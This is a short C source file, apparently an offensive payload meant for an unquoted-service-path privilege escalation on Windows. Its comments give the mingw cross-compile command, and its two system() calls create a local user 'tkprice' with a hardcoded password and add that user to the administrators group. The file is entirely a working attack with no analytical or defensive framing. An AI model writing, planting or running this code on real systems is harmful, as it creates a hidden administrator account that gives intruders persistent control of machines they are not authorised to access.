//Cross compile x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
//Create user and add to administrators group
//Used in unquoted service path
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user tkprice password123! /add");
  i = system ("net localgroup administrators tkprice /add");
  
  return 0;
}
